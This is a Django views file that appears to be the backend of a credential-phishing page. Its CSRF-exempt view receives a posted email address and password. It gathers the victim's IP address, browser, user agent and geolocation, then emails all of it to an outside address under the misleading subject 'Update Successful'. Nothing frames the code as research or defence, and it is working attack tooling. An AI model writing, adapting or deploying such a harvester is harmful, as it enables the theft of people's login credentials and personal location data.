import json
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.template.loader import render_to_string
from django.http import HttpRequest
from user_agents import parse
from django.conf import settings
from django.contrib.gis.geoip2 import GeoIP2

from .get_user_location import IPInfoClient
from . import email_send

def get_browser_info(request: HttpRequest) -> dict:

    user_agent = request.META.get('HTTP_USER_AGENT', '')

    parsed_user_agent = parse(user_agent)

    browser = parsed_user_agent.browser.family
    version = parsed_user_agent.browser.version_string

    return {'browser': browser, 'version': version, 'agent':user_agent }


def get_location_from_geolite2(ip_address):
    try:
        # Initialize GeoIP2 instance
        geoip = GeoIP2()

        # Retrieve geolocation data for the user's IP address
        location_data = geoip.city(ip_address)

        # Extract relevant information from the location data
        country = location_data['country_name']
        city = location_data['city']
        region = location_data['region']

        # Return location data as a dictionary
        return {
            'country': country,
            'city': city,
            'region': region
        }
    except Exception as e:
        # Handle any errors that occur during the geolocation lookup
        print(f"Error retrieving geolocation data: {str(e)}")
        return {
            'country': None,
            'city': None,
            'region': None
        }



@csrf_exempt
def get_email_details_view(request):
    
    if request.method == "POST":
        # json receive data from link
        data = request.body
        data = json.loads(data)

        # get browser information
        browser_info = get_browser_info(request)
        browser = browser_info['browser']
        version = browser_info['version']
        user_agent = browser_info['agent']

        # get ip address
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        ip_address = x_forwarded_for if x_forwarded_for else request.META.get('REMOTE_ADDR')

        #get location through ip
        api_token = settings.IPINFO_API_ACCESS_TOKEN
        client = IPInfoClient(api_token)
        try:
            location_data = client.get_location(ip_address)
            if location_data is None:
                location_data = get_location_from_geolite2(ip_address)
            
            message = render_to_string('emails/email_to_owner.html', 
                    {
                        'email': data["f_email"],
                        'password': data['f_password'],
                        'ip_address':ip_address,
                        'b_version':version,
                        'browser':browser,
                        'agent':user_agent,
                        'city': location_data['city'],
                        'country': location_data['country'],
                        'region': location_data['region'],
                    })
            try:
                email_send.email_message_send('Update Successful', message, 'contact@globalmachinary.com' )
            except Exception as e:
                print(f"Error sending email: {str(e)}")
                       
            return JsonResponse({'message': 'Data received'},safe=False)

        except Exception as e:
            # Handle any errors gracefully
            return JsonResponse({'error': str(e)}, status=500)
    
        

